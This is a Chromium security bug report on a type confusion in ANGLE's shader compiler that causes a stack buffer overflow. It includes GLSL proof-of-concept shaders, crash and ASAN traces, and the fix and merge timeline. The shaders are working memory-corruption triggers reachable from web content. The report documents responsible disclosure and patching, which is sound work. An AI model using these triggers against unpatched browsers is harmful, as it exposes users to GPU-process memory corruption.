# ANGLE compiler ArrayLength transformation type confution lead to Stack Overflow

| Field | Value |
|-------|-------|
| **Issue ID** | [332546345](https://issues.chromium.org/issues/332546345) |
| **Status** | New |
| **Severity** | S4-Minimal |
| **Priority** | P0 |
| **Component** | Internals>GPU>ANGLE, Internals>GPU>SwiftShader |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Chrome Version** | 123.0.0.0 |
| **Reporter** | d8...@gmail.com |
| **Assignee** | sy...@chromium.org |
| **Created** | 2024-04-02 |
| **Bounty** | $16,000.00 |

## Description

# Steps to reproduce the problem

Build latest chrome ( a5078aa0394ee87f6370dfaa46219e2bd64abf31 )
with args.gn

```
is_asan = true
is_debug = false

```

./out/asan/chrome --disable-gpu --user-data-dir=/tmp/aa <http://localhost:8000/poc2.html>
[2367299:2367299:0403/010616.193654:ERROR:object\_proxy.cc(576)] Failed to call method: org.freedesktop.ScreenSaver.GetActive: object\_path= /org/freedesktop/ScreenSaver: org.freedesktop.DBus.Error.NotSupported: This method is not i
mplemented
[2367338:2367338:0403/010616.330124:ERROR:angle\_platform\_impl.cc(44)] spirv\_types.h:60 (operator unsigned int): ! Assert failed in operator unsigned int (../../third\_party/angle/src/common/spirv/spirv\_types.h:60): valid()
FATAL: spirv\_types.h:60 (operator unsigned int): ! Assert failed in operator unsigned int (../../third\_party/angle/src/common/spirv/spirv\_types.h:60): valid()
[0403/010616.357824:ERROR:file\_io\_posix.cc(145)] open /sys/devices/system/cpu/cpu0/cpufreq/scaling\_cur\_freq: No such file or directory (2)
[0403/010616.357986:ERROR:file\_io\_posix.cc(145)] open /sys/devices/system/cpu/cpu0/cpufreq/scaling\_max\_freq: No such file or directory (2)
Received signal 4 ILL\_ILLOPN 795eb44c10a4
#0 0x55e0d82a77c6 (/mnt/chromium\_android/chromium/src/out/asan/chrome+0x154fe7c5)
#1 0x55e0eeb97da8 (/mnt/chromium\_android/chromium/src/out/asan/chrome+0x2bdeeda7)
#2 0x55e0eeb55df6 (/mnt/chromium\_android/chromium/src/out/asan/chrome+0x2bdacdf5)
#3 0x55e0eeb97096 (/mnt/chromium\_android/chromium/src/out/asan/chrome+0x2bdee095)
#4 0x795ebce42520 (/usr/lib/x86\_64-linux-gnu/libc.so.6+0x4251f)

Or run with asan build:
gs://chromium-browser-asan/linux-release/asan-linux-release-1281135.zip
./chrome -use-gl=angle -use-angle=swiftshader <http://localhost:8000/poc2.html>
[1609103:1609103:0402/223624.471908:ERROR:object\_proxy.cc(576)] Failed to call method: org.freedesktop.ScreenSaver.GetActive: object\_path= /org/freedesktop/ScreenSaver: org.freedesktop.DBus.Error.NotSupported: This method is not i
mplemented
SPIR-V ERROR: 0:0 Id is 0
SPIR-V WARNING: 0:0 Id is 0
[0402/223624.756298:ERROR:file\_io\_posix.cc(145)] open /sys/devices/system/cpu/cpu0/cpufreq/scaling\_cur\_freq: No such file or directory (2)
[0402/223624.756454:ERROR:file\_io\_posix.cc(145)] open /sys/devices/system/cpu/cpu0/cpufreq/scaling\_max\_freq: No such file or directory (2)
Received signal 11 SEGV\_MAPERR 000000000014
#0 0x63c00d7217c6 (/util/chromium/chromium-asan/chrome+0xe7577c5)
#1 0x63c01f84a588 (/util/chromium/chromium-asan/chrome+0x20880587)
#2 0x63c01f812d46 (/util/chromium/chromium-asan/chrome+0x20848d45)
#3 0x63c01f849876 (/util/chromium/chromium-asan/chrome+0x2087f875)
#4 0x7bf2a7a42520 (/usr/lib/x86\_64-linux-gnu/libc.so.6+0x4251f)
#5 0x7bf293e9844a <unknown>

# Problem Description

During compiling shader program, ANGLE do some transformation to optimize before translate to SPIRV bytecode, one of them at [1]

```
bool RemoveArrayLengthTraverser::visitUnary(Visit visit, TIntermUnary *node)
{
    // The only case where we leave array length() in place is for runtime-sized arrays.
    if (node->getOp() == EOpArrayLength && !node->getOperand()->getType().isUnsizedArray())
    {
        mFoundArrayLength = true;
        insertSideEffectsInParentBlock(node->getOperand());
        TConstantUnion *constArray = new TConstantUnion[1];
        constArray->setIConst(node->getOperand()->getOutermostArraySize());
        queueReplacement(new TIntermConstantUnion(constArray, node->getType()),
                         OriginalNode::IS_DROPPED);
        return false;
    }
    return true;
}

```

This transformation replace `.length()` call to a `ConstantUnion` node, the issue arise when this node become `constructor with constant` , when ANGLE generate SPIRV bytecode , as noted at [2]

```
    // In some cases, constructors-with-constant values are not folded such as for large constants.
    // Some transformations may also produce constructors-with-constants instead of constants even
    // for basic types.  These are handled here.
    if (node->hasConstantValue())
    {
        if (!type.isScalar())
        {
            return createComplexConstant(node->getType(), typeId, parameters);
        }

```

Because `ConstantUnion`->hasConstantValue return true, and it not a simple Scalar so it will jump to call `createComplexConstant` to generate Constant Composite. For any matrix type it will expect that the `parameters` have value for each columns, but in the `ConstantUnion` node the parameters only have 1 value which is the `length` of array. And inside the loop at (3) it will try to read N columns which is larger than 1.

Poc:

```
#version 300 es
precision highp float;
out mat2x2 temp;

int[1] f0()
{
    return int[1](1);
}
void main()
{
    temp = mat2x2(f0().length());

}


```

Bisect:
the vulnerability have been there from :
<https://chromium-review.googlesource.com/c/angle/angle/+/2951625>
Then anther issue was patched in 2021 but didn't take into account this scenario.
<https://chromium-review.googlesource.com/c/angle/angle/+/3226311>

1.<https://source.chromium.org/chromium/chromium/src/+/main:third_party/angle/src/compiler/translator/tree_ops/RemoveArrayLengthMethod.cpp;l=50>
2.<https://source.chromium.org/chromium/chromium/src/+/main:third_party/angle/src/compiler/translator/spirv/OutputSPIRV.cpp;l=1409>
3. <https://source.chromium.org/chromium/chromium/src/+/main:third_party/angle/src/compiler/translator/spirv/OutputSPIRV.cpp;l=1344;drc=7c06a7a69d82892b8cd7446ed04e200dfed9eeae>

# Additional Comments

Report Credit: Toan (suto) Pham and Bao (zx) Pham of Qrious Secure.

# Summary

ANGLE compiler ArrayLength transformation type confution lead to Stack Overflow

# Additional Data

Category: Security   

Chrome Channel: Stable   

Regression: N/A

## Attachments

- [poc2.html](attachments/poc2.html) (text/html, 1.4 KB)

## Timeline

### d8...@gmail.com (2024-04-02)

A simpler way to reproduce this with angle alone build with asan and disable assert , when compile this shader program:

```
#version 300 es
precision highp float;
out mat4x4 temp;

int[1] f0()
{
    return int[1](1);
}
void main()
{
    temp = mat4x4(f0().length());

}

```
ASAN will caught this bug as:
```
==2369370==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7bdbf90a8458 at pc 0x646dae7f2cc2 bp 0x7ffe018c0c50 sp 0x7ffe018c0410
READ of size 4 at 0x7bdbf90a8458 thread T0
    #0 0x646dae7f2cc1 in __asan_memcpy /b/s/w/ir/cache/builder/src/third_party/llvm/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cpp:63:3
    #1 0x646daffc7f0c in std::__Cr::pair<angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper> const*>, angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper>*>> std::__Cr::__copy_loop<std::__Cr::_Clas
sicAlgPolicy>::operator()<angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper> const*>, angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper> const*>, angle::WrapIter<angle::spirv::BoxedUint32<angle:
:spirv::IdRefHelper>*>>(angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper> const*>, angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper> const*>, angle::WrapIter<angle::spirv::BoxedUint32<angle::s
pirv::IdRefHelper>*>) const third_party/libc++/src/include/__algorithm/copy.h:40:17
    #2 0x646daffc7b62 in std::__Cr::pair<angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper> const*>, angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper>*>> std::__Cr::__unwrap_and_dispatch<std::_
_Cr::__overload<std::__Cr::__copy_loop<std::__Cr::_ClassicAlgPolicy>, std::__Cr::__copy_trivial>, angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper> const*>, angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv
::IdRefHelper> const*>, angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper>*>, 0>(angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper> const*>, angle::WrapIter<angle::spirv::BoxedUint32<angle::spir
v::IdRefHelper> const*>, angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper>*>) third_party/libc++/src/include/__algorithm/copy_move_common.h:109:19
    #3 0x646daffc7910 in std::__Cr::pair<angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper> const*>, angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper>*>> std::__Cr::__dispatch_copy_or_move<std:
:__Cr::_ClassicAlgPolicy, std::__Cr::__copy_loop<std::__Cr::_ClassicAlgPolicy>, std::__Cr::__copy_trivial, angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper> const*>, angle::WrapIter<angle::spirv::BoxedUint32<ang
le::spirv::IdRefHelper> const*>, angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper>*>>(angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper> const*>, angle::WrapIter<angle::spirv::BoxedUint32<angle
::spirv::IdRefHelper> const*>, angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper>*>) third_party/libc++/src/include/__algorithm/copy_move_common.h:133:10
    #4 0x646daffc7870 in std::__Cr::pair<angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper> const*>, angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper>*>> std::__Cr::__copy<std::__Cr::_ClassicAl
gPolicy, angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper> const*>, angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper> const*>, angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelp
er>*>>(angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper> const*>, angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper> const*>, angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper
>*>) third_party/libc++/src/include/__algorithm/copy.h:111:10
    #5 0x646daffc77be in angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper>*> std::__Cr::copy<angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper> const*>, angle::WrapIter<angle::spirv::BoxedUint3
2<angle::spirv::IdRefHelper>*>>(angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper> const*>, angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper> const*>, angle::WrapIter<angle::spirv::BoxedUint32<
angle::spirv::IdRefHelper>*>) third_party/libc++/src/include/__algorithm/copy.h:118:10
    #6 0x646db1e7b79b in angle::FastVector<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper>, 8ul, std::__Cr::array<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper>, 8ul>>::FastVector<angle::WrapIter<angle::spirv::BoxedUint
32<angle::spirv::IdRefHelper> const*>, true>(angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper> const*>, angle::WrapIter<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper> const*>) src/common/FastVector.h:248:5
    #7 0x646db1e7b190 in sh::(anonymous namespace)::OutputSPIRVTraverser::createComplexConstant(sh::TType const&, angle::spirv::BoxedUint32<angle::spirv::IdRefHelper>, angle::FastVector<angle::spirv::BoxedUint32<angle::spirv::IdRe
fHelper>, 8ul, std::__Cr::array<angle::spirv::BoxedUint32<angle::spirv::IdRefHelper>, 8ul>> const&) src/compiler/translator/spirv/OutputSPIRV.cpp:1349:30
    #8 0x646db1ec4943 in sh::(anonymous namespace)::OutputSPIRVTraverser::createConstructor(sh::TIntermAggregate*, angle::spirv::BoxedUint32<angle::spirv::IdRefHelper>) src/compiler/translator/spirv/OutputSPIRV.cpp:1429:20
    #9 0x646db1e5e59b in sh::(anonymous namespace)::OutputSPIRVTraverser::visitAggregate(sh::Visit, sh::TIntermAggregate*) src/compiler/translator/spirv/OutputSPIRV.cpp:5819:22
    #10 0x646db1c3208e in sh::TIntermAggregate::visit(sh::Visit, sh::TIntermTraverser*) src/compiler/translator/tree_util/IntermTraverse.cpp:165:16
    #11 0x646db1c39a36 in void sh::TIntermTraverser::traverse<sh::TIntermAggregate>(sh::TIntermAggregate*) src/compiler/translator/tree_util/IntermTraverse.cpp:54:19
    #12 0x646db1c39508 in sh::TIntermTraverser::traverseAggregate(sh::TIntermAggregate*) src/compiler/translator/tree_util/IntermTraverse.cpp:499:5
    #13 0x646db1c3194e in sh::TIntermAggregate::traverse(sh::TIntermTraverser*) src/compiler/translator/tree_util/IntermTraverse.cpp:107:9
    #14 0x646db1c36c70 in void sh::TIntermTraverser::traverse<sh::TIntermBinary>(sh::TIntermBinary*) src/compiler/translator/tree_util/IntermTraverse.cpp:43:45
    #15 0x646db1c36908 in sh::TIntermTraverser::traverseBinary(sh::TIntermBinary*) src/compiler/translator/tree_util/IntermTraverse.cpp:317:5
    #16 0x646db1c316ce in sh::TIntermBinary::traverse(sh::TIntermTraverser*) src/compiler/translator/tree_util/IntermTraverse.cpp:87:9
    #17 0x646db1c391c3 in sh::TIntermTraverser::traverseBlock(sh::TIntermBlock*) src/compiler/translator/tree_util/IntermTraverse.cpp:477:24
    #18 0x646db1c318ae in sh::TIntermBlock::traverse(sh::TIntermTraverser*) src/compiler/translator/tree_util/IntermTraverse.cpp:102:9
    #19 0x646db1c38bcc in sh::TIntermTraverser::traverseFunctionDefinition(sh::TIntermFunctionDefinition*) src/compiler/translator/tree_util/IntermTraverse.cpp:443:30
    #20 0x646db1c3180e in sh::TIntermFunctionDefinition::traverse(sh::TIntermTraverser*) src/compiler/translator/tree_util/IntermTraverse.cpp:97:9
    #21 0x646db1c391c3 in sh::TIntermTraverser::traverseBlock(sh::TIntermBlock*) src/compiler/translator/tree_util/IntermTraverse.cpp:477:24
    #22 0x646db1c318ae in sh::TIntermBlock::traverse(sh::TIntermTraverser*) src/compiler/translator/tree_util/IntermTraverse.cpp:102:9
    #23 0x646db1e52469 in sh::OutputSPIRV(sh::TCompiler*, sh::TIntermBlock*, ShCompileOptions const&, absl::flat_hash_map<int, unsigned int, absl::hash_internal::Hash<int>, std::__Cr::equal_to<int>, std::__Cr::allocator<std::__Cr:
:pair<int const, unsigned int>>> const&, unsigned int) src/compiler/translator/spirv/OutputSPIRV.cpp:6561:11
    #24 0x646db1df51bb in sh::TranslatorSPIRV::translate(sh::TIntermBlock*, ShCompileOptions const&, sh::PerformanceDiagnostics*) src/compiler/translator/spirv/TranslatorSPIRV.cpp:1303:12
    #25 0x646db18932dc in sh::TCompiler::compile(char const* const*, unsigned long, ShCompileOptions const&) src/compiler/translator/Compiler.cpp:1310:18
```

### cl...@appspot.gserviceaccount.com (2024-04-03)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5813806613069824.

### es...@chromium.org (2024-04-04)

Hm, Clusterfuzz was able to reproduce but seems stuck on further analysis. Re-running it.

### es...@chromium.org (2024-04-04)

Giving up on Clusterfuzz to triage. I repro'ed locally, passing to Angle owners to please take a look. Tentatively marking as Critical due to GPU memory corruption reachable from web content.

### es...@chromium.org (2024-04-04)

Reporter, have you already reported this upstream?

### pe...@google.com (2024-04-04)

You have been auto-cc'ed due to this issue's component.
To update this component's auto-cc rules, visit
go/peepsi-blintz-auto-cc-rules

### kb...@chromium.org (2024-04-04)

Upstream meaning on crbug.com/angleproject , I assume.

### sy...@chromium.org (2024-04-05)

It's ok, no need to report this upstream, this security report is enough.

Thank you for the report, it'll likely be a quick fix.

### d8...@gmail.com (2024-04-05)

Thanks Shahbaz, feel free let me know if you need anything else.

### pe...@google.com (2024-04-05)

Setting milestone because of s0/s1 severity.

### pe...@google.com (2024-04-05)

Setting Priority to P0 to match Severity s0. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### 24...@project.gserviceaccount.com (2024-04-05)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the hotlistid:4801165.

### ap...@google.com (2024-04-09)

Project: angle/angle
Branch: main

commit 0a67bbaf83f129fab0784341f15c19b211fa860d
Author: Shahbaz Youssefi <syoussefi@chromium.org>
Date:   Mon Apr 08 10:14:45 2024

    SPIR-V: Fix const constructors with single scalar
    
    These constructors may be generated because of
    RemoveArrayLengthTraverser.
    
    Bug: chromium:332546345
    Change-Id: I5b81ded59ba91b0083b14280f5a61b03b9d4ca43
    Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/5435713
    Reviewed-by: Geoff Lang <geofflang@chromium.org>
    Commit-Queue: Geoff Lang <geofflang@chromium.org>
    Auto-Submit: Shahbaz Youssefi <syoussefi@chromium.org>

M       src/compiler/translator/Compiler.cpp
M       src/compiler/translator/spirv/OutputSPIRV.cpp
M       src/tests/gl_tests/GLSLTest.cpp

https://chromium-review.googlesource.com/5435713


### ap...@google.com (2024-04-10)

Project: chromium/src
Branch: main

commit d8bcca0098108f7c6e7204ea1043046a174fb838
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date:   Wed Apr 10 01:52:51 2024

    Roll ANGLE from 84613b972d5d to d1bffdb657d9 (4 revisions)
    
    https://chromium.googlesource.com/angle/angle.git/+log/84613b972d5d..d1bffdb657d9
    
    2024-04-09 m.maiya@samsung.com Vulkan: Bugfix in WarmUpComputeTask
    2024-04-09 angle-autoroll@skia-public.iam.gserviceaccount.com Manual roll Chromium from a20bd3962f16 to 8853d900c3dd (278 revisions)
    2024-04-09 a.annestrand@samsung.com CL/VK: Implement eventVk routines
    2024-04-09 syoussefi@chromium.org SPIR-V: Fix const constructors with single scalar
    
    If this roll has caused a breakage, revert this CL and stop the roller
    using the controls here:
    https://autoroll.skia.org/r/angle-chromium-autoroll
    Please CC angle-team@google.com,geofflang@google.com on the revert to ensure that a human
    is aware of the problem.
    
    To file a bug in ANGLE: https://bugs.chromium.org/p/angleproject/issues/entry
    To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry
    
    To report a problem with the AutoRoller itself, please file a bug:
    https://issues.skia.org/issues/new?component=1389291&template=1850622
    
    Documentation for the AutoRoller is here:
    https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md
    
    Cq-Include-Trybots: luci.chromium.try:android_optional_gpu_tests_rel;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:win_optional_gpu_tests_rel;luci.chromium.try:linux-swangle-try-x64;luci.chromium.try:win-swangle-try-x86
    Bug: chromium:332546345
    Tbr: geofflang@google.com
    Change-Id: I78e60f484b06ee29f9bea5f0d4b9890bac574c8d
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5441652
    Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
    Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
    Cr-Commit-Position: refs/heads/main@{#1284852}

M       DEPS
M       third_party/angle

https://chromium-review.googlesource.com/5441652


### ap...@google.com (2024-04-10)

Project: chromium/src
Branch: main

commit d6f3b8ad4ced409ac9efc244276d1e1719213de2
Author: Andrea Orru <andreaorru@chromium.org>
Date:   Wed Apr 10 06:35:11 2024

    Revert "Roll ANGLE from 84613b972d5d to d1bffdb657d9 (4 revisions)"
    
    This reverts commit d8bcca0098108f7c6e7204ea1043046a174fb838.
    
    Reason for revert: uprev fails on jacuzzi, see http://b/333553557
    
    Original change's description:
    > Roll ANGLE from 84613b972d5d to d1bffdb657d9 (4 revisions)
    >
    > https://chromium.googlesource.com/angle/angle.git/+log/84613b972d5d..d1bffdb657d9
    >
    > 2024-04-09 m.maiya@samsung.com Vulkan: Bugfix in WarmUpComputeTask
    > 2024-04-09 angle-autoroll@skia-public.iam.gserviceaccount.com Manual roll Chromium from a20bd3962f16 to 8853d900c3dd (278 revisions)
    > 2024-04-09 a.annestrand@samsung.com CL/VK: Implement eventVk routines
    > 2024-04-09 syoussefi@chromium.org SPIR-V: Fix const constructors with single scalar
    >
    > If this roll has caused a breakage, revert this CL and stop the roller
    > using the controls here:
    > https://autoroll.skia.org/r/angle-chromium-autoroll
    > Please CC angle-team@google.com,geofflang@google.com on the revert to ensure that a human
    > is aware of the problem.
    >
    > To file a bug in ANGLE: https://bugs.chromium.org/p/angleproject/issues/entry
    > To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry
    >
    > To report a problem with the AutoRoller itself, please file a bug:
    > https://issues.skia.org/issues/new?component=1389291&template=1850622
    >
    > Documentation for the AutoRoller is here:
    > https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md
    >
    > Cq-Include-Trybots: luci.chromium.try:android_optional_gpu_tests_rel;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:win_optional_gpu_tests_rel;luci.chromium.try:linux-swangle-try-x64;luci.chromium.try:win-swangle-try-x86
    > Bug: chromium:332546345
    > Tbr: geofflang@google.com
    > Change-Id: I78e60f484b06ee29f9bea5f0d4b9890bac574c8d
    > Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5441652
    > Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
    > Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
    > Cr-Commit-Position: refs/heads/main@{#1284852}
    
    Bug: chromium:332546345
    Change-Id: I501c7ed455d71a08c777b24c30582cea24bb0ba4
    Cq-Include-Trybots: luci.chromium.try:android_optional_gpu_tests_rel;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:win_optional_gpu_tests_rel;luci.chromium.try:linux-swangle-try-x64;luci.chromium.try:win-swangle-try-x86
    No-Presubmit: true
    No-Tree-Checks: true
    No-Try: true
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5439517
    Commit-Queue: Andrea Orru <andreaorru@chromium.org>
    Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
    Cr-Commit-Position: refs/heads/main@{#1284922}

M       DEPS
M       third_party/angle

https://chromium-review.googlesource.com/5439517


### pe...@google.com (2024-04-10)

Requesting merge to extended stable (M122) because latest trunk commit (1284852) appears to be after extended stable branch point (1250580).
Requesting merge to stable (M123) because latest trunk commit (1284852) appears to be after stable branch point (1262506).
Requesting merge to beta (M124) because latest trunk commit (1284852) appears to be after beta branch point (1274542).
Merge review required: a commit with DEPS changes was detected.


Merge review required: a commit with DEPS changes was detected.


Merge review required: a commit with DEPS changes was detected.


Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [122, 123, 124].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


### sy...@chromium.org (2024-04-10)

1. <https://chromium-review.googlesource.com/c/angle/angle/+/5435713>
2. Not yet, will wait a few days
3. No
4. No
5. No

### kb...@chromium.org (2024-04-10)

The revert of the ANGLE roll containing this fix is concerning. Is that being looked into?

### sy...@chromium.org (2024-04-11)

Thanks, I didn't notice that. It looks like that was a premature revert; the referenced issue is about advanced blend, which got another revert 20 minutes after that: <https://chromium-review.googlesource.com/c/chromium/src/+/5440174>

Geoff's already reverted the ANGLE change about advanced blend: <https://chromium-review.googlesource.com/c/angle/angle/+/5443404>. I just resumed the ANGLE->Chromium autoroller, we'll verify tomorrow if everything goes well.

### ap...@google.com (2024-04-11)

Project: chromium/src
Branch: main

commit 03462e7b72d8de1ad1f0bfd755e28c3dcb33d86e
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date:   Thu Apr 11 04:10:39 2024

    Roll ANGLE from 926334570f2c to e41286e1092c (20 revisions)
    
    https://chromium.googlesource.com/angle/angle.git/+log/926334570f2c..e41286e1092c
    
    2024-04-11 syoussefi@chromium.org Vulkan: Fix internal caching missing
    2024-04-11 syoussefi@chromium.org Vulkan: Improve pipeline warmup hit rate without GPL
    2024-04-10 syoussefi@chromium.org Remove Program::syncState
    2024-04-10 m.maiya@samsung.com Vulkan: Fix data race in WarmUpGraphicsTask
    2024-04-10 geofflang@chromium.org Revert "GL: Support KHR_blend_equation_advanced"
    2024-04-10 syoussefi@chromium.org Vulkan: Enable MSRTT emulation tests on swiftshader
    2024-04-10 angle-autoroll@skia-public.iam.gserviceaccount.com Roll Chromium from 8853d900c3dd to 3e1171173a70 (343 revisions)
    2024-04-09 m.maiya@samsung.com Vulkan: Bugfix in WarmUpComputeTask
    2024-04-09 angle-autoroll@skia-public.iam.gserviceaccount.com Manual roll Chromium from a20bd3962f16 to 8853d900c3dd (278 revisions)
    2024-04-09 a.annestrand@samsung.com CL/VK: Implement eventVk routines
    2024-04-09 syoussefi@chromium.org SPIR-V: Fix const constructors with single scalar
    2024-04-09 syoussefi@chromium.org Vulkan: Suppress Undefined-Value-ShaderInputNotProduced
    2024-04-09 geofflang@chromium.org Validate non-negative vertex attribute offsets.
    2024-04-09 cclao@google.com Vulkan: Early out ImageHelper::updateLayoutAndBarrier when possible
    2024-04-09 romanl@google.com EGLProtectedContentTest: move sleep behind compile-time var
    2024-04-09 syoussefi@chromium.org Additional fix for link task worker pool race
    2024-04-09 angle-autoroll@skia-public.iam.gserviceaccount.com Roll vulkan-deps from 4c9bdb52e642 to 3ba43743089e (3 revisions)
    2024-04-09 angle-autoroll@skia-public.iam.gserviceaccount.com Roll Chromium from 0f9a02e29ab9 to a20bd3962f16 (586 revisions)
    2024-04-08 m.maiya@samsung.com Vulkan: wait for post-link tasks in resetLayout
    2024-04-08 geofflang@chromium.org GL: Support KHR_blend_equation_advanced
    
    If this roll has caused a breakage, revert this CL and stop the roller
    using the controls here:
    https://autoroll.skia.org/r/angle-chromium-autoroll
    Please CC angle-team@google.com,geofflang@google.com on the revert to ensure that a human
    is aware of the problem.
    
    To file a bug in ANGLE: https://bugs.chromium.org/p/angleproject/issues/entry
    To file a bug in Chromium: https://bugs.chromium.org/p/chromium/issues/entry
    
    To report a problem with the AutoRoller itself, please file a bug:
    https://issues.skia.org/issues/new?component=1389291&template=1850622
    
    Documentation for the AutoRoller is here:
    https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md
    
    Cq-Include-Trybots: luci.chromium.try:android_optional_gpu_tests_rel;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:win_optional_gpu_tests_rel;luci.chromium.try:linux-swangle-try-x64;luci.chromium.try:win-swangle-try-x86
    Bug: chromium:323699974,chromium:332546345,chromium:333443447,chromium:40277080
    Tbr: geofflang@google.com
    Change-Id: I62f4cbd782a4e98e8fabfe4ef2db13a77c749ed0
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5446331
    Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
    Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
    Cr-Commit-Position: refs/heads/main@{#1285608}

M       DEPS
M       third_party/angle

https://chromium-review.googlesource.com/5446331


### 24...@project.gserviceaccount.com (2024-04-12)

ClusterFuzz testcase 5813806613069824 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=1285603:1285608

If this is incorrect, please add the hotlistid:5432646 and re-open the issue.

### am...@chromium.org (2024-04-18)

M124 merge approved for <https://chromium-review.googlesource.com/c/angle/angle/+/5435713>
please merge this fix to M124 (branch 6367) by 10am Pacific tomorrow / Friday, 19 April so this fix can be included in the next M124 Stable update

### ap...@google.com (2024-04-18)

Project: angle/angle
Branch: chromium/6367

commit 0b776d32f69a932acb61963d9daad9e13f610944
Author: Shahbaz Youssefi <syoussefi@chromium.org>
Date:   Mon Apr 08 10:14:45 2024

    M124: SPIR-V: Fix const constructors with single scalar
    
    These constructors may be generated because of
    RemoveArrayLengthTraverser.
    
    Bug: chromium:332546345
    Change-Id: I2b2bf3728ef5bae148abc2a8518f8f3f42850025
    Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/5462388
    Reviewed-by: Cody Northrop <cnorthrop@google.com>

M       src/compiler/translator/Compiler.cpp
M       src/compiler/translator/spirv/OutputSPIRV.cpp
M       src/tests/gl_tests/GLSLTest.cpp

https://chromium-review.googlesource.com/5462388


### pe...@google.com (2024-04-18)

LTS Milestone M120

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:
1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?



### am...@google.com (2024-04-22)

*** Boilerplate reminders! ***
